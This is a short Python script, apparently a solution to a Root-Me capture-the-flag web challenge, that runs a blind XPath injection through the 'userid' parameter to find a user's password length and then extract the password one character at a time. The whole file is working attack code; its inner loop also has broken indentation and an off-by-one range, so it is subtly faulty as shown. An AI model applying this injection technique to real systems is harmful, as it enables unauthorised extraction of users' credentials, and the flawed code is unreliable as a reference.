#from __future__ import print_function
import requests
import re

url = 'http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid='

i = 1
s = url + '2 and string-length(password)=%d'
print('password_len: ', end='')
while True:
    r = requests.get(s % i)
    if re.search('John', r.text) is not None:
      password_len = i
      print(i)
      break
    i += 1

charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
s = url + '2 and substring(password,%d,1)=codepoints-to-string(%d)'
print('password: ', end='')
for i in range(password_len + 1):
    for c in charset:
      r = requests.get(s % (i, ord(c)))
      if re.search('John', r.text) is not None:
      print(c, end='')
      break
print('\nDone!') 
